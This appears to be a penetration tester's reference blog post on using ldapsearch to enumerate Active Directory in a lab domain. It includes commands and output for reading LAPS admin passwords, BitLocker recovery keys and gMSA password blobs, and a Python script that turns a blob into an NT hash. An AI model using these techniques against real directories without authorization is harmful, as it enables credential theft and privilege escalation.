---
title: "LDAPSearch Reference"
source_url: https://malicious.link/posts/2022/ldapsearch-reference/
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: ad
---

`ldapsearch` is a extremely powerful tool, especially for Windows Active Directory enumeration. It’s one of my primary tools when performing pentesting or red teaming against an environment with Active Directory, but also comes in quiet handy to know as many times it can come default installed or part of a base image, so its a bit Living-Off-The-Land-esq. Another point towards ldapsearch is that it’s easy to forget that Active Directory isn’t the only LDAP server in most environments and the ability to utilize a tool like this can come in extremely handy.

If you want to find Active Directory LDAP servers, use the following command:

| ``` 1  ```  | ``` $ dig -t SRV _ldap._tcp.dc._msdcs.sittingduck.info  ```  |

### Basic Usage

- `-x` Basic Authentication, you usually use this if you are going to include a username and password (instead of something like a kerberos ticket)
- `-h` IP address or hostname
- `-H` URL to force protocol and/or add port number`-H ldaps://dc1.b.com` or`-H ldaps://dc1.b.com:6636` (636 is the default port for LDAPS, but can be connected to on 389 and is sometimes found with an additional 6 in the front as shown).`3269` is the Global Catalog port and can also accept LDAPS queries sometimes (you may have to ignore cert errors for this to work, depending on your setup).
- `-b` Base, generally this is Distinguished Name format for example`dc=google,dc=com`
- `-D` Username and Domain (not FQDN)`"sittingduck\uberuser"` . For maximum Kerberos based authentication you can also specify your user in`uberuser@SITTINGDUCK.INFO` form, but ldapsearch will auto user the current user in Kerberos tickets available, so this can be omitted
- `-LLL` This removes all of the extra log output of the search
- `-Y GSSAPI` Used for Kerberos based authentication, however this is on by default and not needed (if installed), but you can specify it just to test to see if SASL is installed.`apt install libsasl2-modules-gssapi-mit` if it isn’t. Once installed, you do not need to keep this on the command line.
- `-E` is for[extended controls](https://ldapwiki.com/wiki/LDAPControlsList) which are generally OIDs, but can also be:
- `-E pr=1000/noprompt` By default`ldapsearch` will pull 1000 records maximum. Adding this it will pull 1000 records at a time until it has printed all results to the screen.
- `-O minssf=0,maxssf=0` This option will fix some errors during SASL (Kerberos) authentication. Technically this shouldn’t do anything based on the RFC, but it’s essentially telling the LDAP protocol that there isn’t a min or a max size for the authentication packets.
- `-o ldif-wrap=no` This options makes the output non-wrapped, which is the best format to pull out things like certificates and other very long strings.
- `-W` and`-w` -`-W` will prompt for the password, with`-w` you can specify the password on the command line. If you do not specify one of these`ldapsearch` will assume no password for the account. You can lock accounts out this way.
- `LDAPTLS_REQCERT=never ldapsearch {arguments}` This is used when you are connecting to a self signed, or SSL enabled LDAP that your system cannot verify the certificate for.
- `-N` Do not try to have the host name of your target DC attempted to perform a reverse DNS on the IP to match them. This is needed when the Domain Controller doesn’t have a valid reverse DNS record from your standpoint on the network and you are using Kerberos.

### LDAP Search Filters

After the arguments comes the filter, then the attributes. Filters are like search terms. For example `"(ms-Mcs-AdmPwdExpirationTtime=*)"` is a search that says if the LDAP object has the `ms-Mcs-AdmPwdExpirationTtime` attribute and it’s not empty. LDAP filters are a bit odd, as they need to be within parentheses completely. In order to do a search for `x` AND `y` you have to do something like this `(&(x=*)(y=*))`. This search says only return results that have `x` and `y` and both are not empty. Here is a real world example:

| ``` 1  ```  | ``` "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"  ```  |

This says all objects that have `servicesPrincipalName` attributes, it is a normal account (512) [see more here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) AND is NOT `!`  disabled (2).

Note: `1.2.840.113556.1.4.803` is an LDAP feature that says `LDAP_MATCHING_RULE_BIT_AND` which is basically a bitwise `AND`. For example, a standard user account is `512` but would be `514` if disabled, but a computer account is `4096` and `4098` if disabled. Used the bitwise function you can account for both scenarios since it’s looking in the `2` binary location.

Everything after the filter is selection of attributes. (also known as “parameters” if you are used to Powershell and AD Objects)

### Interesting Attributes

- `msDS-Approx-Immed-Subordinates` - Gives you a count of objects directly below the specified “Base”`-b`
- `NTSecurityDescriptor` - This is the SDSF in binary and base64 format, and will only be displayed if you request it specifically for the object.
- `msDS-ManagedPassword` - This is a at-runtime built attribute that is the current NT hash of the Group Managed Service Account GMSA.**!WARNING!** See below before querying.
- `msFVE-RecoveryPassword` - This is also an at-runtine built attribute that is the current BitLocker secret key for the computer account you query.**!WARNING!** See below before querying.

### Null Session Starting

This can be done without any authentication and will give you a ton of information about the LDAP server in question (usually Active Directory):

| ``` 1  ```  | ``` $ ldapsearch -h 192.168.80.100 -x -b "" -s base \* +  ```  |

#### Example Output

| ```   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97  98  99 100 101 102 103 104 105 106 107 108 109  ```  | ``` # extended LDIF # # LDAPv3 # base <> with scope baseObject # filter: (objectclass=*) # requesting: * +  #  # dn: currentTime: 20220513212748.0Z subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=sittingduck,DC=i  nfo dsServiceName: CN=NTDS Settings,CN=DC2,CN=Servers,CN=Default-First-Site-Name,C  N=Sites,CN=Configuration,DC=sittingduck,DC=info namingContexts: DC=sittingduck,DC=info namingContexts: CN=Configuration,DC=sittingduck,DC=info namingContexts: CN=Schema,CN=Configuration,DC=sittingduck,DC=info namingContexts: DC=DomainDnsZones,DC=sittingduck,DC=info namingContexts: DC=ForestDnsZones,DC=sittingduck,DC=info defaultNamingContext: DC=sittingduck,DC=info schemaNamingContext: CN=Schema,CN=Configuration,DC=sittingduck,DC=info configurationNamingContext: CN=Configuration,DC=sittingduck,DC=info rootDomainNamingContext: DC=sittingduck,DC=info supportedControl: 1.2.840.113556.1.4.319 supportedControl: 1.2.840.113556.1.4.801 supportedControl: 1.2.840.113556.1.4.473 supportedControl: 1.2.840.113556.1.4.528 supportedControl: 1.2.840.113556.1.4.417 supportedControl: 1.2.840.113556.1.4.619 supportedControl: 1.2.840.113556.1.4.841 supportedControl: 1.2.840.113556.1.4.529 supportedControl: 1.2.840.113556.1.4.805 supportedControl: 1.2.840.113556.1.4.521 supportedControl: 1.2.840.113556.1.4.970 supportedControl: 1.2.840.113556.1.4.1338 supportedControl: 1.2.840.113556.1.4.474 supportedControl: 1.2.840.113556.1.4.1339 supportedControl: 1.2.840.113556.1.4.1340 supportedControl: 1.2.840.113556.1.4.1413 supportedControl: 2.16.840.1.113730.3.4.9 supportedControl: 2.16.840.1.113730.3.4.10 supportedControl: 1.2.840.113556.1.4.1504 supportedControl: 1.2.840.113556.1.4.1852 supportedControl: 1.2.840.113556.1.4.802 supportedControl: 1.2.840.113556.1.4.1907 supportedControl: 1.2.840.113556.1.4.1948 supportedControl: 1.2.840.113556.1.4.1974 supportedControl: 1.2.840.113556.1.4.1341 supportedControl: 1.2.840.113556.1.4.2026 supportedControl: 1.2.840.113556.1.4.2064 supportedControl: 1.2.840.113556.1.4.2065 supportedControl: 1.2.840.113556.1.4.2066 supportedControl: 1.2.840.113556.1.4.2090 supportedControl: 1.2.840.113556.1.4.2205 supportedControl: 1.2.840.113556.1.4.2204 supportedControl: 1.2.840.113556.1.4.2206 supportedControl: 1.2.840.113556.1.4.2211 supportedControl: 1.2.840.113556.1.4.2239 supportedControl: 1.2.840.113556.1.4.2255 supportedControl: 1.2.840.113556.1.4.2256 supportedLDAPVersion: 3 supportedLDAPVersion: 2 supportedLDAPPolicies: MaxPoolThreads supportedLDAPPolicies: MaxPercentDirSyncRequests supportedLDAPPolicies: MaxDatagramRecv supportedLDAPPolicies: MaxReceiveBuffer supportedLDAPPolicies: InitRecvTimeout supportedLDAPPolicies: MaxConnections supportedLDAPPolicies: MaxConnIdleTime supportedLDAPPolicies: MaxPageSize supportedLDAPPolicies: MaxBatchReturnMessages supportedLDAPPolicies: MaxQueryDuration supportedLDAPPolicies: MaxTempTableSize supportedLDAPPolicies: MaxResultSetSize supportedLDAPPolicies: MinResultSets supportedLDAPPolicies: MaxResultSetsPerConn supportedLDAPPolicies: MaxNotificationPerConn supportedLDAPPolicies: MaxValRange supportedLDAPPolicies: MaxValRangeTransitive supportedLDAPPolicies: ThreadMemoryLimit supportedLDAPPolicies: SystemMemoryLimitPercent highestCommittedUSN: 2830648 supportedSASLMechanisms: GSSAPI supportedSASLMechanisms: GSS-SPNEGO supportedSASLMechanisms: EXTERNAL supportedSASLMechanisms: DIGEST-MD5 dnsHostName: dc2.sittingduck.info ldapServiceName: sittingduck.info:dc2$@SITTINGDUCK.INFO serverName: CN=DC2,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura  tion,DC=sittingduck,DC=info supportedCapabilities: 1.2.840.113556.1.4.800 supportedCapabilities: 1.2.840.113556.1.4.1670 supportedCapabilities: 1.2.840.113556.1.4.1791 supportedCapabilities: 1.2.840.113556.1.4.1935 supportedCapabilities: 1.2.840.113556.1.4.2080 supportedCapabilities: 1.2.840.113556.1.4.2237 isSynchronized: TRUE isGlobalCatalogReady: TRUE domainFunctionality: 3 forestFunctionality: 3 domainControllerFunctionality: 6  # search result search: 2 result: 0 Success  # numResponses: 2 # numEntries: 1  ```  |

You can learn the `dnsHostName` of the LDAP server you pinged, the `dn` which is useful for picking your base search if you don’t know it, the `domainFunctionality` level (aka the [Domain Functional Level](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6dd88965-8feb-4369-ae7e-075985da8071)) will give you a sense of what capabilities and GPOs can be set. The `supportedControl` and `supportedCapabilities` are more advanced topics, but these basically say what you can and can’t do on the server.

## Interesting Searches

The following are searches that I’ve found interesting or impactful in my experience.

### LAPs Passwords

This search will only show computers with LAPs enabled, and if you can read any passwords, what the password currently is.

Notice that this user can read every password except `SDLEGACY2K3` and `SDEXCHANGE`

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20  ```  | ``` $ ldapsearch -LLL -h 192.168.80.10 -b "dc=sittingduck,dc=info" -x -D "sittingduck\uberuser" -w "ASDqwe123" '(ms-Mcs-AdmPwdExpirationtime=*)' ms-Mcs-AdmPwd  dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info ms-Mcs-AdmPwd: f/0HG3)7d5P+e;/IE5wW8I/o//5)}W  dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: /B+%R26cVSA1c0zOi[-Z/#n1Q2sA,,  dn: CN=SDLEGACY2K3,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info  dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: }b+BC@p,7))6pqxj3y]MxBm9@h9Hy-  dn: CN=SDEXCHANGE,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info  dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info ms-Mcs-AdmPwd: ]]3-%AN574#{/%t55!S+0!/10OJC;V  dn: CN=DC2,OU=Domain Controllers,DC=sittingduck,DC=info ms-Mcs-AdmPwd: kMo,85{N(uhUmWj183,3#T&d[Aeddv  ```  |

### BitLocker Recovery Passwords

The key on this one is narrowing down the search base to a small list or a single computer. The reason this is important is that the Domain Controller you are asking the password from has to do a bunch of decryption to calculate this attribute on the fly, if you ask for too many (like every machine in the Domain) the connection will be closed out due to timeout. Don’t be greedy, just get the one you need.

| ``` 1  ```  | ``` $ ldapsearch -h dc1.sittingduck.info -b "CN=WIN10COMP1,OU=Workstations,DC=sittingduck,DC=info" msfve-recoverypassword  ```  |

### GMSA NT Hash

- src: [https://stealthbits.com/blog/securing-gmsa-passwords/](https://stealthbits.com/blog/securing-gmsa-passwords/)
- src: [https://github.com/SecureAuthCorp/impacket/pull/770](https://github.com/SecureAuthCorp/impacket/pull/770)

Group Managed Service Accounts (GMSA) have randomly generated passwords that are default/generally pretty long. The `msDS-ManagedPassword` in an at-runtime decrypted value that the Domain Controller has to construct in order to return, much like the BitLocker keys. However, unlike with BitLocker, generally there aren’t very many GMSAs so it’s less of a chance to knock over the DC if you get greedy and query them all.

| ``` 1 2 3 4  ```  | ``` $ LDAPTLS_REQCERT=never ldapsearch -LLL -H ldaps://192.168.80.10 -x -D uberuser -w ASDqwe123 -o ldif-wrap=no -b 'dc=sittingduck,dc=info' '(&(ObjectClass=msDS-GroupManagedServiceAccount))' msDS-ManagedPassword dn: CN=TestGMSA,CN=Managed Service Accounts,DC=sittingduck,DC=info  msDS-ManagedPassword:: AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA=  ```  |

Once you have this blob of text, you need to convert it into the NT hash using this tool:

(this is a slightly modified version of the script that [agsolino](https://twitter.com/agsolino) posted)

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79  ```  | ``` #!/usr/bin/env python3 from impacket.structure import hexdump, Structure import base64 import sys, getopt # Source from: https://github.com/SecureAuthCorp/impacket/pull/770#issuecomment-589243865  class MSDS_MANAGEDPASSWORD_BLOB(Structure):     structure = (         ('Version','<H'),         ('Reserved','<H'),         ('Length','<L'),         ('CurrentPasswordOffset','<H'),         ('PreviousPasswordOffset','<H'),         ('QueryPasswordIntervalOffset','<H'),         ('UnchangedPasswordIntervalOffset','<H'),         ('CurrentPassword',':'),         ('PreviousPassword',':'),         #('AlignmentPadding',':'),         ('QueryPasswordInterval',':'),         ('UnchangedPasswordInterval',':'),     )      def __init__(self, data = None):         Structure.__init__(self, data = data)      def fromString(self, data):         Structure.fromString(self,data)          if self['PreviousPasswordOffset'] == 0:             endData = self['QueryPasswordIntervalOffset']         else:             endData = self['PreviousPasswordOffset']          self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]         if self['PreviousPasswordOffset'] != 0:             self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]          self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]         self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]  def main(argv):     b64 = ""     verbose = False     try:         opts, args = getopt.getopt(argv,"hvb:",["base64="])     except getopt.GetoptError:         print ('gmsa.py -b <msDS-ManagedPassword base64> -v (optional verbose)')         sys.exit(2)     for opt, arg in opts:         if opt == '-h':             print ('gmsa.py -b <msDS-ManagedPassword base64> -v (optional verbose)')             sys.exit()         elif opt in ("-v"):             verbose = True         elif opt in ("-b", "--base64"):             b64 = arg      if b64 == "":         print ('gmsa.py -b <msDS-ManagedPassword base64> -v (optional verbose)')         sys.exit()      test = base64.b64decode(b64)      blob = MSDS_MANAGEDPASSWORD_BLOB()     blob.fromString(test)     if verbose == True:         blob.dump()         print("="*80)         print("Cleartext Password")         hexdump(blob['CurrentPassword'][:-2])     from Cryptodome.Hash import MD4     hash = MD4.new ()     hash.update (blob['CurrentPassword'][:-2])     print("="*80)     print("NTHash: {}".format(hash.hexdigest()))     print("="*80)  if __name__ == "__main__":    main(sys.argv[1:])  ```  |

| ``` 1 2 3 4  ```  | ``` $ python3 ./gmsa.py -b AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA= ================================================================================ NTHash: 78450c9611e6c9515e2a489f9b31cc3e ================================================================================  ```  |

If you want to learn more about GMSAs and a newer attack called the “Golden GMSA” check out the Sempris blog here: [https://www.semperis.com/blog/golden-gmsa-attack/](https://www.semperis.com/blog/golden-gmsa-attack/)

### Certificate Authorities and Templates

This is a list of certificate templates that are enabled on each certificate authority in the domain.

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  ```  | ``` $ ldapsearch -LLL -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sittingduck,DC=info" -h 192.168.80.10 -w "ASDqwe123" -D "uberuser"  certificateTemplates  dn: CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration  ,DC=sittingduck,DC=info  dn: CN=sittingduck-W2KCA-CA,CN=Enrollment Services,CN=Public Key Services,CN=S  ervices,CN=Configuration,DC=sittingduck,DC=info certificateTemplates: ExchangeUser certificateTemplates: ExchangeUserSignature certificateTemplates: EnrollmentAgentOffline certificateTemplates: MachineEnrollmentAgent certificateTemplates: EnrollmentAgent certificateTemplates: CrossCA certificateTemplates: CodeSigning certificateTemplates: CEPEncryption certificateTemplates: CAExchange certificateTemplates: ClientAuth certificateTemplates: Workstation certificateTemplates: UserSignature certificateTemplates: CTLSigning certificateTemplates: SmartcardUser certificateTemplates: SmartcardLogon certificateTemplates: OfflineRouter certificateTemplates: RASAndIASServer certificateTemplates: OCSPResponseSigning certificateTemplates: KeyRecoveryAgent certificateTemplates: IPSECIntermediateOffline certificateTemplates: IPSECIntermediateOnline certificateTemplates: DirectoryEmailReplication certificateTemplates: DomainControllerAuthentication certificateTemplates: KerberosAuthentication certificateTemplates: EFSRecovery certificateTemplates: EFS certificateTemplates: DomainController certificateTemplates: WebServer certificateTemplates: Machine certificateTemplates: User certificateTemplates: SubCA certificateTemplates: Administrator  ```  |

### Nested Group Membership

A query like this:

| ``` 1  ```  | ``` $ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b "dc=sittingduck,dc=info" '(memberOf=cn=Domain Admins,cn=Users,dc=SittingDuck,dc=info)' cn  ```  |

will result in all of the accounts that have a `memberOf` attribute of Domain Admins. This will show you the first level of membership, but LDAP/AD actually has a way to identify nested membership using the [1.2.840.113556.1.4.1941](https://ldapwiki.com/wiki/1.2.840.113556.1.4.1941) [OID](https://ldapwiki.com/wiki/OID):

| ``` 1  ```  | ``` $ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b "dc=sittingduck,dc=info" '(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=sittingduck,dc=info)' cn  ```  |

This will show you all Domain Admins even if they are in a group in a group in a group in a group.

### Find Exchange Servers

| ``` 1 2 3  ```  | ``` $ ldapsearch -LLL -h 192.168.80.10 -o ldif-wrap=no -x -D uberuser -w ASDqwe123 -b "cn=Configuration,dc=sittingduck,dc=info" "(objectCategory=msExchExchangeServer)" dn  dn: CN=SDEXCHANGE,CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=sittingduck,DC=info  ```  |

### Deleted / Tombstoned objects

Looking at deleted and tombstoned objects won’t always get you much information you can directly use, but sometimes there are passwords or other sensitive data stored in objects. (I don’t believe deleting objects changes their permissions but I could be wrong here)

| ``` 1  ```  | ``` $ ldapsearch -h 192.168.80.10 -x -w ASDqwe123 -D uberuser -b "CN=Deleted Objects,DC=sittingduck,DC=info" -E '!1.2.840.113556.1.4.417'  ```  |

For example here is a Computer account that was deleted:

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ```  | ``` # blah1 DEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef, Deleted Objects, sittingduck.  info dn: CN=blah1\0ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN=Deleted Objects,DC=  sittingduck,DC=info objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user objectClass: computer cn:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg== distinguishedName: CN=blah1\0ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN=Dele  ted Objects,DC=sittingduck,DC=info instanceType: 4 whenCreated: 20220512041425.0Z whenChanged: 20220512045921.0Z uSNCreated: 2663983 isDeleted: TRUE uSNChanged: 2664044 name:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg== objectGUID:: sRl7L+6dSEqLsK1i5qKH7w== userAccountControl: 4128 objectSid:: AQUAAAAAAAUVAAAAfS9vpuKLWG5ZpW7N9RUAAA== sAMAccountName: BLAH1$ lastKnownParent: CN=Computers,DC=sittingduck,DC=info isRecycled: TRUE  ```  |

### Replication Metadata

- src: [https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19](https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19)
- src: [https://stackoverflow.com/a/38710484](https://stackoverflow.com/a/38710484)

This is one place where ldapsearch isn’t quite as cool as other tools, all of the base64 output. I did [find a great way to decode most of it](https://stackoverflow.com/a/38710484) on StackOverflow:

- `| perl -MMIME::Base64 -n -00 -e 's/\n +//g;s/(?<=:: )(\S+)/decode_base64($1)/eg;print'`

Basically you are pipeing the output of `ldapsearch` into a bit of perl that Base64 decodes anything that looks like Base64.

Back on track, there is a ton of great info in Replication metadata but the blog post from SpecterOps above.

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18  ```  | ``` $ ldapsearch -h 192.168.80.10 -o ldif-wrap=no -x -w ASDqwe123 -D sittingduck\\uberuser -b "CN=Administrator,CN=Users,DC=sittingduck,DC=info" msDS-ReplAttributeMetaData                       # extended LDIF # # LDAPv3 # base <CN=Administrator,CN=Users,DC=sittingduck,DC=info> with scope subtree # filter: (objectclass=*) # requesting: msDS-ReplAttributeMetaData #  # Administrator, Users, sittingduck.info dn: CN=Administrator,CN=Users,DC=sittingduck,DC=info msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5tc0RTLVN1cHBvcnRlZEVuY3J5cHRpb25UeXBlczwvcHN6QXR0cmlidXRlTmFtZT4KCTxkd1ZlcnNpb24+MTwvZHdWZXJzaW9uPgoJPGZ0aW1lTGFzdE9y aWdpbmF0aW5nQ2hhbmdlPjIwMTUtMTAtMTRUMDM6Mjg6MTRaPC9mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZT4KCTx1dWlkTGFzdE9yaWdpbmF0aW5nRHNhSW52b2NhdGlvbklEPjhkMmExZjVjLTU4ZDQtNGVmYS1iY2QyLWY3ZDg1ZWY1MzAxMzwvdXVpZExhc3RPcmlna W5hdGluZ0RzYUludm9jYXRpb25JRD4KCTx1c25PcmlnaW5hdGluZ0NoYW5nZT4xMjc3NjwvdXNuT3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXNuTG9jYWxDaGFuZ2U+MTI3NzY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaW dpbmF0aW5nRHNhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA== msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5sYXN0TG9nb25UaW1lc3RhbXA8L3BzekF0dHJpYnV0ZU5hbWU+Cgk8ZHdWZXJzaW9uPjI8L2R3VmVyc2lvbj4KCTxmdGltZUxhc3RPcmlnaW5hdGluZ0No YW5nZT4yMDE3LTA2LTIwVDAwOjE3OjIyWjwvZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXVpZExhc3RPcmlnaW5hdGluZ0RzYUludm9jYXRpb25JRD4yOWJkZWQ4MS0xMGRmLTQ0YTMtOGVkNi0xOWY1ODJjYjhiNGU8L3V1aWRMYXN0T3JpZ2luYXRpbmdEc2FJb nZvY2F0aW9uSUQ+Cgk8dXNuT3JpZ2luYXRpbmdDaGFuZ2U+MzQzOTQ2PC91c25PcmlnaW5hdGluZ0NoYW5nZT4KCTx1c25Mb2NhbENoYW5nZT4zNDM5NDY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaWdpbmF0aW5nRH NhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA==  ```  |

With the Perl trick:

| ```  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  ```  | ``` $ ldapsearch -h 192.168.80.10 -o ldif-wrap=no -x -w ASDqwe123 -D sittingduck\\uberuser -b "CN=Administrator,CN=Users,DC=sittingduck,DC=info" msDS-ReplAttributeMetaData \| perl -MMIME::Base64 -n -00 -e 's/\n +//g;s/(?<=:: )(\S+)/decode_base64($1)/eg;print' # extended LDIF # # LDAPv3 # base <CN=Administrator,CN=Users,DC=sittingduck,DC=info> with scope subtree # filter: (objectclass=*) # requesting: msDS-ReplAttributeMetaData #  # Administrator, Users, sittingduck.info dn: CN=Administrator,CN=Users,DC=sittingduck,DC=info msDS-ReplAttributeMetaData:: <DS_REPL_ATTR_META_DATA>         <pszAttributeName>msDS-SupportedEncryptionTypes</pszAttributeName>         <dwVersion>1</dwVersion>         <ftimeLastOriginatingChange>2015-10-14T03:28:14Z</ftimeLastOriginatingChange>         <uuidLastOriginatingDsaInvocationID>8d2a1f5c-58d4-4efa-bcd2-f7d85ef53013</uuidLastOriginatingDsaInvocationID>         <usnOriginatingChange>12776</usnOriginatingChange>         <usnLocalChange>12776</usnLocalChange>         <pszLastOriginatingDsaDN></pszLastOriginatingDsaDN> </DS_REPL_ATTR_META_DATA>  msDS-ReplAttributeMetaData:: <DS_REPL_ATTR_META_DATA>         <pszAttributeName>lastLogonTimestamp</pszAttributeName>         <dwVersion>2</dwVersion>         <ftimeLastOriginatingChange>2017-06-20T00:17:22Z</ftimeLastOriginatingChange>         <uuidLastOriginatingDsaInvocationID>29bded81-10df-44a3-8ed6-19f582cb8b4e</uuidLastOriginatingDsaInvocationID>         <usnOriginatingChange>343946</usnOriginatingChange>         <usnLocalChange>343946</usnLocalChange>         <pszLastOriginatingDsaDN></pszLastOriginatingDsaDN> </DS_REPL_ATTR_META_DATA>  ```  |

### NTSecurityDescriptor

While I personally don’t recall ever running into an instance where I wasn’t able to read the security descriptor via ldapsearch, it’s just because I’ve only went after very specific objects and not that it never happens. Lee Christensen ([@tifkin_](https://twitter.com/tifkin_)) figured out a way to read security descriptors as low privileged users. Honestly I don’t know how it works, but here it is:

[https://twitter.com/tifkin_/status/1372628611677753344](https://twitter.com/tifkin_/status/1372628611677753344)

Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv’ed user? Add the following argument:

`-E '!1.2.840.113556.1.4.801=::MAMCAQc='`

Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv'ed user? Add the following argument:

